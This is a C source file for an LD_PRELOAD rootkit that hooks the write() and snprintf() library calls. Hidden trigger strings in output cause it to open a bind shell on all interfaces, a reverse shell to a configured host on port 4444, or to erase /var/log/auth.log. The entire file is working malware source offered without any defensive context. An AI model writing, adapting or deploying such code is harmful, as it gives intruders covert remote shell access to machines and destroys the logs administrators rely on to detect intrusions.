#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <unistd.h>
#include <string.h>
#include <dlfcn.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <arpa/inet.h>

#include "config.h"

int rev_shell()
{
    int sock;
    
    struct sockaddr_in serv_addr;
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(4444);
    inet_aton(host, &serv_addr.sin_addr);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr));

    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);

    execve("/bin/sh", NULL, NULL);

    return 0;
}


int bind_shell()
{
    struct sockaddr_in serv_addr;
    int sock_fd = socket(AF_INET, SOCK_STREAM, 0);

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(LISTENING_PORT);
    serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    
    bind(sock_fd, (struct sockaddr*)&serv_addr, sizeof(serv_addr));
    listen(sock_fd, 5);

    int client_fd = accept(sock_fd, NULL, NULL);
    dup2(client_fd, 0);
    dup2(client_fd, 1);
    dup2(client_fd, 2);

    execve("/bin/sh", NULL, NULL);
    close(sock_fd);

    return 0;
}

ssize_t write(int fd, const void *buf, size_t nbytes)
{
    ssize_t (*new_write)(int fd, const void *buf, size_t nbytes);
    ssize_t ret;
    new_write = dlsym(RTLD_NEXT, "write");

    char *trigger_1 = strstr(buf, TRIGGER_1);
    char *clear_logs = strstr(buf, TRIGGER_3);
    char *trigger_2 = strstr(buf, TRIGGER_2);
    if (trigger_1 != NULL) //we know we want to make a bind shell
    {
	fd = open("/dev/null", O_WRONLY | O_APPEND);
	ret = new_write(fd, buf, nbytes);
	bind_shell();
    }

    else if (clear_logs != NULL)
    {
	system("sudo echo "" > /var/log/auth.log");
	fd = open("/dev/null", O_WRONLY | O_APPEND);
	ret = new_write(fd, buf, nbytes);
    }

    else if (trigger_2 != NULL)
    {
	fd = open("/dev/null", O_WRONLY | O_APPEND);
	ret = new_write(fd, buf, nbytes);
	rev_shell();
    }

    else
    {
	ret = new_write(fd, buf, nbytes);
    }

    return ret;
}

int snprintf(char *str, size_t size, const char *format, ...)
{
    int (*new_snprintf)(char *str, size_t size, const char *format, ...);
    int ret;
    new_snprintf = dlsym(RTLD_NEXT, "snprintf");

    va_list func_args;
    va_start(func_args, format);
    const char *buffer = va_arg(func_args, const char*);

    char *trigger_found = strstr(buffer, TRIGGER_1);
    if (trigger_found != NULL)
    {
	    ret = new_snprintf(str, size, format, func_args);
	    bind_shell();
    }

    else
    {
	    ret = new_snprintf(str, size, format, func_args);
    }

    va_end(func_args);
    return ret;
}
